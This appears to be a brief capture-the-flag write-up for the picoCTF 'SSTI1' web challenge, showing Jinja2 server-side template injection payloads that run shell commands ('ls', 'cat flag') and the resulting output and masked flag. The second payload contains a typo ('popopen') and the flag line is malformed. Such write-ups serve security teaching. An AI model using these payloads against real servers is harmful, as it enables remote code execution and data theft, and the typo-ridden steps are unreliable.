🚩 SSTI1
📝 Challenge Overview
Category: Web Exploitation

Concepts: Server-Side Template Injection (SSTI), Remote Code Execution (RCE), Jinja2

Description: This challenge demonstrates a classic Server-Side Template Injection vulnerability in a Python-based web application. By escaping the template sandbox, we achieve Remote Code Execution (RCE) to enumerate the server's file system and extract the flag.


METHODLOGY;

{{lipsum.__globals__.os.popen('ls').read()}}

> output received
__pycache__
app.py
flag
requirements.txt

>flag
{{lipsum.__globals__.os.popopen('cat flag').read()}}

> capturedt the flag ;
picto{picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3cXXXX_XXX_XXXX_XXXXXX}
